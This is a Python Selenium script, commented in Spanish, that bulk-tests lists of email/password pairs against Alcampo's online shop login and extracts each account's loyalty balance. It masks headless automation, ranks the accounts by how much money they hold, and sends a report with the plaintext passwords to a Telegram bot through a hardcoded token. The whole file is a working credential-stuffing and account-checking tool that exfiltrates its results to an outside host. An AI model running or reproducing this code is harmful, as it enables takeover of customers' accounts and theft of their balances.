#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Alcampo Account Balance Scraper - Versión Limpia, Rápida y Robusta
Sin circuit breakers ni bloqueos innecesarios.
Soporta archivos Excel (.xlsx, .ods), CSV y JSON directamente.
"""
import sys
import time
import re
import json
import argparse
import os
import html
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import pandas as pd

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')

ROOT = Path(__file__).resolve().parent
ACCOUNTS_FILE = ROOT / "accounts.json"
EXCEL_FILE = ROOT / "saldos_alcampo.xlsx"
RESULTS_JSON_FILE = ROOT / "results.json"
RESULTS_CSV_FILE = ROOT / "results.csv"

log_lock = threading.Lock()
results_lock = threading.Lock()


def mask_email(email_str):
    if not email_str or "@" not in email_str:
        return email_str or ""
    parts = email_str.split("@", 1)
    user, domain = parts[0], parts[1]
    if len(user) <= 2:
        masked_user = user[0] + "*"
    else:
        masked_user = user[:2] + "*" * (len(user) - 2)
    return f"{masked_user}@{domain}"


def log_msg(thread_idx, email, step, status="", error=""):
    now_str = time.strftime("%Y-%m-%d %H:%M:%S")
    masked = mask_email(email)
    msg_parts = [f"[{now_str}]", f"[Hilo {thread_idx}]", f"[{masked}]", f"Paso: {step}"]
    if status:
        msg_parts.append(f"Estado: {status}")
    if error:
        msg_parts.append(f"Detalle: {error}")
    with log_lock:
        print(" | ".join(msg_parts))


def save_account_result(result_item):
    with results_lock:
        # 1. Update results.json atomically
        all_results = []
        if RESULTS_JSON_FILE.exists():
            try:
                with open(RESULTS_JSON_FILE, "r", encoding="utf-8") as f:
                    all_results = json.load(f)
                    if not isinstance(all_results, list):
                        all_results = []
            except Exception:
                all_results = []
        # Replace if email already in results or append
        existing_idx = next((i for i, r in enumerate(all_results) if r.get("email") == result_item.get("email")), None)
        if existing_idx is not None:
            all_results[existing_idx] = result_item
        else:
            all_results.append(result_item)
        temp_json = RESULTS_JSON_FILE.with_suffix(".tmp")
        with open(temp_json, "w", encoding="utf-8") as f:
            json.dump(all_results, f, indent=2, ensure_ascii=False)
        temp_json.replace(RESULTS_JSON_FILE)

        # 2. Update results.csv
        try:
            df = pd.DataFrame(all_results)
            temp_csv = RESULTS_CSV_FILE.with_suffix(".tmp")
            df.to_csv(temp_csv, index=False, encoding="utf-8")
            temp_csv.replace(RESULTS_CSV_FILE)
        except Exception:
            pass


# Install ChromeDriver once
try:
    CHROME_DRIVER_PATH = ChromeDriverManager().install()
except Exception as e:
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"


def get_telegram_config():
    token = (os.environ.get("TELEGRAM_TOKEN") or "").strip()
    chat_id = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
    if not token or not chat_id:
        return "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU", -5049278431
    try:
        return token, int(chat_id)
    except ValueError:
        return "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU", -5049278431


def enviar_telegram_texto(token, chat_id, mensaje):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        requests.post(url, data={"chat_id": chat_id, "text": mensaje, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        print(f"Error Telegram: {e}")


def enviar_telegram_documento(token, chat_id, path, caption=""):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    try:
        with open(path, "rb") as f:
            requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"document": f}, timeout=30)
    except Exception as e:
        print(f"Error Telegram Documento: {e}")


def limpiar_saldo(saldo_str):
    if saldo_str is None:
        return None
    texto = str(saldo_str).strip()
    if not texto or "Error" in texto or "No encontrado" in texto:
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
    if not match:
        return None
    limpio = match.group(0).replace(',', '.')
    try:
        return float(limpio)
    except ValueError:
        return None


def cargar_cuentas_desde_archivo(filepath=None):
    target_path = None
    if filepath:
        p1 = Path(filepath)
        p2 = ROOT / filepath
        p3 = Path.cwd() / filepath
        for p in [p1, p2, p3]:
            if p.exists() and p.is_file():
                target_path = p
                break
        if not target_path:
            target_path = p1
    else:
        candidates = [
            ROOT / "credenciales_limpias.xlsx",
            Path("credenciales_limpias.xlsx"),
            ROOT / "accounts.json",
            Path("accounts.json"),
            ROOT / "cuentasError.ods",
            Path("cuentasError.ods"),
            ROOT / "saldos_alcampo.xlsx"
        ]
        for cand in candidates:
            if cand.exists() and cand.is_file() and cand.stat().st_size > 0:
                target_path = cand
                break

    if not target_path or not target_path.exists():
        print(f"❌ Error: No se encontró ningún archivo de cuentas.")
        sys.exit(1)

    print(f"📂 Cargando cuentas desde: {target_path}")
    ext = target_path.suffix.lower()

    if ext == ".json":
        with open(target_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, list) else data.get("accounts", [])

    elif ext in [".xlsx", ".xls", ".ods", ".csv"]:
        if ext == ".csv":
            df = pd.read_csv(target_path)
        elif ext == ".ods":
            df = pd.read_excel(target_path, engine="odf")
        else:
            df = pd.read_excel(target_path)

        cols_lower = {str(c).strip().lower(): c for c in df.columns}
        email_col = next((cols_lower[c] for c in ["email", "correo", "usuario", "account", "cuentas", "mail", "user"] if c in cols_lower), df.columns[0])
        pass_col = next((cols_lower[c] for c in ["password", "pass", "contraseña", "clave", "contrasena", "pwd"] if c in cols_lower), df.columns[1] if len(df.columns) > 1 else None)

        accounts = []
        for _, row in df.iterrows():
            email_val = str(row[email_col]).strip() if pd.notna(row[email_col]) else ""
            pass_val = str(row[pass_col]).strip() if pass_col and pd.notna(row[pass_col]) else ""
            if email_val and "@" in email_val and not email_val.lower().startswith("email"):
                accounts.append({"email": email_val, "password": pass_val})

        print(f"✔ Se cargaron {len(accounts)} cuentas desde {target_path.name}")
        return accounts
    else:
        print(f"❌ Formato no soportado: {ext}")
        sys.exit(1)


def procesar_cuenta(acc, thread_idx, total_accs, current_idx):
    email = acc["email"]
    password = acc["password"]
    log_msg(thread_idx, email, f"Inicio ({current_idx}/{total_accs})", "Procesando")
    
    driver = None
    saldo = "Error: Desconocido"
    res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        
        driver = webdriver.Chrome(service=Service(CHROME_DRIVER_PATH), options=chrome_options)
        driver.set_page_load_timeout(15)
        driver.implicitly_wait(1)

        # 1. Login
        log_msg(thread_idx, email, "Navegando a login", "En progreso")
        driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
        wait = WebDriverWait(driver, 15)
        
        # Aceptar cookies si aparecen
        try:
            accept_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Aceptar') or contains(@id, 'accept') or contains(@class, 'cookie')]")
            driver.execute_script("arguments[0].click();", accept_btn)
        except Exception:
            pass

        email_field = wait.until(EC.presence_of_element_located((By.ID, "uname1")))
        password_field = driver.find_element(By.ID, "pwd1")

        email_field.clear()
        email_field.send_keys(email)
        password_field.clear()
        password_field.send_keys(password)
        
        log_msg(thread_idx, email, "Enviando credenciales", "Enviando")
        # Enviar formulario mediante botón de Salesforce authorization o ENTER
        submit_btn = driver.find_elements(By.ID, "btnSubmit_login")
        if submit_btn:
            driver.execute_script("arguments[0].click();", submit_btn[0])
        else:
            password_field.send_keys(Keys.ENTER)

        # 2. Esperar redirección fuera del login y de autorización (máximo 15 s)
        try:
            WebDriverWait(driver, 15).until(
                lambda d: ("compraonline.alcampo.es" in d.current_url and "login" not in d.current_url and "authorization" not in d.current_url) or any(m.text.strip() for m in d.find_elements(By.CSS_SELECTOR, ".modal.show, .modal-body, #errorNotifyBlockWarning"))
            )
        except Exception:
            pass

        curr_url = driver.current_url.lower()

        # Si ya estamos dentro del portal de compraonline, el login fue 100% exitoso
        if "compraonline.alcampo.es" in curr_url and "login" not in curr_url and "authorization" not in curr_url:
            pass  # Login OK -> Continuar directo a extraer saldo
        else:
            # Sigue en la pantalla de autorización o modal: extraer error real del modal visible
            modal_text = ""
            for modal_el in driver.find_elements(By.CSS_SELECTOR, ".modal.show, .modal-body, #errorNotifyBlockWarning, .alert-danger"):
                txt = modal_el.text.strip().lower()
                if txt:
                    modal_text += " " + txt

            if "bloqueada" in modal_text or "cuenta ha sido bloqueada" in modal_text:
                saldo = "Error: Cuenta bloqueada (Call Center 913 687 857)"
                log_msg(thread_idx, email, "Resultado login", "BLOQUEADA", saldo)
                res_dict = {"email": email, "password": password, "saldo": saldo, "status": "BLOQUEADA"}
                save_account_result(res_dict)
                return res_dict

            if "incorrect" in modal_text or "credenciales" in modal_text or "call center" in modal_text or "913 687 857" in modal_text:
                saldo = "Error: Credenciales incorrectas"
                log_msg(thread_idx, email, "Resultado login", "ERROR", saldo)
                res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
                save_account_result(res_dict)
                return res_dict

            # Si sigue en authorization sin modal visible
            saldo = "Error: Credenciales incorrectas o bloqueo"
            log_msg(thread_idx, email, "Resultado login", "ERROR", saldo)
            res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
            save_account_result(res_dict)
            return res_dict

        # 3. Navegación a settings/loyalty para extraer saldo directamente con DOM
        log_msg(thread_idx, email, "Consultando saldo en /settings/loyalty", "Navegando")
        driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
        time.sleep(3.5)
        page_html = driver.page_source

        match = re.search(r"Tu Saldo es\s*([\d,.]+)\s*(?:&nbsp;|\s)*€?", page_html, re.IGNORECASE)
        if match:
            saldo = f"Tu Saldo es {match.group(1)} €"
        else:
            cleaned_text = re.sub(r'<[^>]+>', ' ', page_html)
            cleaned_text = ' '.join(cleaned_text.split())
            match_clean = re.search(r"Tu Saldo es\s*([\d,.]+)\s*€?", cleaned_text, re.IGNORECASE)
            if match_clean:
                saldo = f"Tu Saldo es {match_clean.group(1)} €"
            else:
                match_alt = re.search(r"Saldo\s*:\s*([\d,.]+)", cleaned_text, re.IGNORECASE)
                if match_alt:
                    saldo = f"Tu Saldo es {match_alt.group(1)} €"
                else:
                    saldo = "Saldo: 0.00 € (o no disponible)"

        log_msg(thread_idx, email, "Extracción de saldo", "OK", saldo)
        res_dict = {"email": email, "password": password, "saldo": saldo, "status": "OK"}
        save_account_result(res_dict)

    except Exception as e:
        saldo = f"Error: {str(e)[:60]}"
        log_msg(thread_idx, email, "Excepción en proceso", "ERROR", saldo)
        res_dict = {"email": email, "password": password, "saldo": saldo, "status": "ERROR"}
        save_account_result(res_dict)
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass

    return res_dict


def parse_args():
    parser = argparse.ArgumentParser(description="Alcampo Scraper Limpio")
    parser.add_argument("input_file_pos", nargs="?", default=None, help="Archivo Excel (.xlsx, .ods), CSV o JSON")
    parser.add_argument("--input-file", type=str, default=None, help="Ruta al archivo de cuentas")
    parser.add_argument("--threads", type=int, default=2, help="Hilos concurrentes (default: 2)")
    parser.add_argument("--limit", type=int, default=None, help="Límite de cuentas a procesar")
    parser.add_argument("--resume", action="store_true", help="Reanudar y saltar cuentas ya procesadas con éxito/OK")
    parser.add_argument("--no-telegram", action="store_true", help="Desactivar envío a Telegram")
    parser.add_argument("--send-telegram", action="store_true", default=True, help="Activar envío a Telegram")
    args = parser.parse_args()
    if args.input_file_pos and not args.input_file:
        args.input_file = args.input_file_pos
    return args


def main():
    args = parse_args()
    accounts = cargar_cuentas_desde_archivo(args.input_file)
    
    if args.resume and RESULTS_JSON_FILE.exists():
        try:
            with open(RESULTS_JSON_FILE, "r", encoding="utf-8") as f:
                prev_data = json.load(f)
                if isinstance(prev_data, list):
                    done_ok_emails = {
                        item.get("email") for item in prev_data
                        if item.get("status") in ["OK", "BLOQUEADA"] or "Tu Saldo es" in str(item.get("saldo", ""))
                    }
                    total_before = len(accounts)
                    accounts = [acc for acc in accounts if acc.get("email") not in done_ok_emails]
                    print(f"🔄 Modo --resume activado: Se omiten {total_before - len(accounts)} cuentas ya procesadas previamente. Restantes: {len(accounts)}")
        except Exception as e:
            print(f"⚠️ Error al leer historial para --resume: {e}")

    if args.limit:
        accounts = accounts[:args.limit]
        print(f"ℹ️ Modo prueba: Limitado a {args.limit} cuentas.")

    num_threads = min(args.threads, len(accounts)) if accounts else 1
    print(f"\n🚀 Iniciando scraper con {len(accounts)} cuentas en {num_threads} hilos concurrentes...\n")
    
    start_time = time.time()
    resultados = []

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {
            executor.submit(procesar_cuenta, acc, (i % num_threads) + 1, len(accounts), i + 1): acc
            for i, acc in enumerate(accounts)
        }
        for future in as_completed(futures):
            try:
                resultados.append(future.result())
            except Exception as e:
                pass

    duration = time.time() - start_time

    # Guardar Excel
    df = pd.DataFrame(resultados)
    df.to_excel(EXCEL_FILE, index=False)
    print(f"\n💾 Resultados guardados en: {EXCEL_FILE}")
    print(f"⏱️ Tiempo total: {duration:.2f} segundos ({duration/60:.2f} minutos)")

    # Resumen
    saldo_total = 0.0
    cuentas_con_saldo = 0
    cuentas_saldo_cero = 0
    cuentas_error = 0
    cuentas_ranked = []

    for r in resultados:
        val = limpiar_saldo(r.get("saldo"))
        if val is None:
            cuentas_error += 1
        elif val > 0:
            saldo_total += val
            cuentas_con_saldo += 1
            cuentas_ranked.append((val, r["email"]))
        else:
            cuentas_saldo_cero += 1

    cuentas_ranked.sort(key=lambda x: x[0], reverse=True)
    top_10 = cuentas_ranked[:10]
    top_10_str = "\n".join(f"   {i+1}. {email} ({val:.2f} €)" for i, (val, email) in enumerate(top_10)) if top_10 else "   N/A"

    mensaje_resumen = (
        f"📊 RESUMEN ALCAMPO\n\n"
        f"✅ Cuentas procesadas: {len(resultados)}\n"
        f"⏱️ Tiempo empleado: {duration/60:.2f} min\n"
        f"💰 Saldo Total: {saldo_total:.2f} €\n"
        f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
        f"💤 Cuentas con saldo 0: {cuentas_saldo_cero}\n"
        f"⚠️ Cuentas con error / bloqueadas: {cuentas_error}\n\n"
        f"🏆 Top Cuentas:\n{top_10_str}"
    )
    print("\n" + mensaje_resumen)

    if not args.no_telegram:
        token, chat_id = get_telegram_config()
        enviar_telegram_texto(token, chat_id, f"<pre>{html.escape(mensaje_resumen)}</pre>")
        enviar_telegram_documento(token, chat_id, EXCEL_FILE, caption="📊 Reporte de saldos Alcampo")
        print("🎉 Reporte enviado a Telegram.")
    else:
        print("ℹ️ Envío a Telegram desactivado.")


if __name__ == "__main__":
    main()
